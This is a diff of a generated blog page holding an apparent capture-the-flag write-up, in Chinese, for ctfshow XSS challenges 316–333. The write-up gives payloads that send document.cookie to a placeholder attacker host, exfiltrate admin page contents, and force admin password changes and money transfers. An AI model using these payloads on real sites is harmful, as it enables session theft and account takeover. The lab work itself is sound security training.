@@ -4,8 +4,8 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="xss, 幻影旅团">
-    <meta name="description" content="ctfshow的xss的wp">
+    <meta name="keywords" content="幻影旅团">
+    <meta name="description" content="title: xssdate: 2022-01-22 19:04:39author: 吹img: falsetop: falsehide: falsecover: falsecoverImg: falsetoc: truemathjax: ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +17,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>xss | 幻影旅团</title>
+    <title>幻影旅团</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
@@ -30,9 +30,9 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="幻影旅团" type="application/atom+xml">
-
+<meta name="generator" content="Hexo 6.0.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="/atom.xml" title="幻影旅团" type="application/atom+xml">
 </head>
 
 
@@ -259,12 +259,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">xss</h1>
+                    <h1 class="description center-align post-title"></h1>
                 </div>
             </div>
         </div>
@@ -378,25 +378,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/xss/">
-                                <span class="chip bg-color">xss</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/ctfshow/" class="post-category">
-                                ctfshow
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -412,14 +399,14 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-02-13
+                    2022-02-19
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    392
+                    490
                 </div>
                 
 
@@ -444,47 +431,57 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>[TOC]</p>
+                <p>title: xss<br>date: 2022-01-22 19:04:39<br>author: 吹<br>img: false<br>top: false<br>hide: false<br>cover: false<br>coverImg: false<br>toc: true<br>mathjax: false<br>summary: ctfshow的xss的wp<br>categories: ctfshow<br>tags:</p>
+<ul>
+<li>xss</li>
+</ul>
+<p>[TOC]</p>
 <p>在自己的vps上搞</p>
 <p>集成环境 安装小皮面板或者宝塔面板</p>
 <h2 id="316"><a href="#316" class="headerlink" title="316"></a>316<img src="/2022/01/22/ctfshow-xss/image-20211120200251538.png" alt="image-20211120200251538"></h2><p>payload:</p>
-<script>window.location.href='http://xxx/1.php?1='+document.cookie;</script>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xxx/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="317"><a href="#317" class="headerlink" title="317"></a>317</h2> 
+<h2 id="317"><a href="#317" class="headerlink" title="317"></a>317</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie" &gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="318"><a href="#318" class="headerlink" title="318"></a>318</h2> 
+<h2 id="318"><a href="#318" class="headerlink" title="318"></a>318</h2><pre class="line-numbers language-none"><code class="language-none">&lt;body onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt; &lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
 
 <h2 id="319"><a href="#319" class="headerlink" title="319"></a>319</h2><p>317-319  分别过滤了 script img 等  上面payload通杀</p>
 <h2 id="320"><a href="#320" class="headerlink" title="320"></a>320</h2><p>过滤了空格</p>
-<p>&lt;body/**/onload=”window.location.href=’<a target="_blank" rel="noopener" href="http://xxx/1.php?1='+document.cookie&quot;>">http://xxx/1.php?1='+document.cookie"&gt;</a></p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h2 id="321"><a href="#321" class="headerlink" title="321"></a>321</h2><p>用‘/’ 或者‘/**/’代替空格</p>
 <h2 id="322"><a href="#322" class="headerlink" title="322"></a>322</h2><p>继续通杀</p>
 <h2 id="323-326"><a href="#323-326" class="headerlink" title="323-326"></a>323-326</h2><p>通杀！！！</p>
 <h2 id="327"><a href="#327" class="headerlink" title="327"></a>327</h2><p>我们要拿到管理员的cookie 收件人要是admin </p>
-<p>&lt;body/**/onload=”window.location.href=’<a target="_blank" rel="noopener" href="http://xxx/1.php?1='+document.cookie&quot;>">http://xxx/1.php?1='+document.cookie"&gt;</a> 不行 </p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;body/**/onload="window.location.href='http://xxx/1.php?1='+document.cookie"&gt;&lt;/body&gt; 不行 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>返璞归真</p>
-<script>window.location.href='http://xss/1.php?1='+document.cookie;</script>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://xss/1.php?1='+document.cookie;&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
 
 <h2 id="328"><a href="#328" class="headerlink" title="328"></a>328</h2><p>要管理员才能查看用户账号密码，我们可以在注册的时候写入xss 等管理员访问的时候拿到管理员cookie</p>
 <p>抓包伪造管理员的cookie</p>
 <p><img src="/2022/01/22/ctfshow-xss/image-20211120214800843.png" alt="image-20211120214800843"></p>
 <h2 id="329"><a href="#329" class="headerlink" title="329"></a>329</h2><p>cookie发送给攻击者之前就失效了，盗用cookie不行，那就直接获取管理员页面的东东</p>
-<script>window.open('http://xxx/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)</script>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.open('http://xxx/1.php?1='+document.getElementsByClassName('layui-table-cell laytable-cell-1-0-1')[1].innerHTML)&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="330"><a href="#330" class="headerlink" title="330"></a>330</h2><p>发现多了一个修改密码页面，抓包 发现有api接口</p>
 <p>让管理员本机127.0.0.1修改密码</p>
-<script>window.location.href='http://127.0.0.1/api/change.php?p=1234'</script>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;window.location.href='http://127.0.0.1/api/change.php?p=1234'&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后管理员登录得到flag</p>
 <h2 id="331"><a href="#331" class="headerlink" title="331"></a>331</h2><p>post方式修改密码 发现.ajax</p>
-<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="332"><a href="#332" class="headerlink" title="332"></a>332</h2><p>让收款人转账为负数，自己就无数的钱了</p>
 <h2 id="333"><a href="#333" class="headerlink" title="333"></a>333</h2><p>非预期解：自己给自己转账 加倍增长，预测15此转即可</p>
 <p>预期解:</p>
 <p>先给自己转1元 抓包看参数。</p>
 <p>然后让管理员转钱</p>
-<script>$.ajax({url:'api/amount.php',type:'post',data:{u:'123',a:'16116'}});</script>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script&gt;$.ajax({url:'api/amount.php',type:'post',data:{u:'123',a:'16116'}});&lt;/script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
                 
@@ -502,7 +499,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">吹</a>
+                    <a href="/about" rel="external nofollow noreferrer">D4marvel</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -525,7 +522,7 @@
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">吹</a>
+                    <a href="/about" target="_blank">D4marvel</a>
                     !
                 </span>
             </div>
@@ -549,11 +546,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/xss/">
-                                    <span class="chip bg-color">xss</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1011,7 +1004,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">13.3k</span>
+                        class="white-color">13.8k</span>
             
             
             
@@ -1196,16 +1189,17 @@ $(function () {
     
 
     
-
-    <!-- 雪花特效 -->
-     
+        
         <script type="text/javascript">
             // 只在桌面版网页启用特效
             var windowWidth = $(window).width();
             if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
+                document.write('<script type="text/javascript" src="/libs/others/sakura.js"><\/script>');
             }
         </script>
+    
+
+    <!-- 雪花特效 -->
     
 
     <!-- 鼠标星星特效 -->
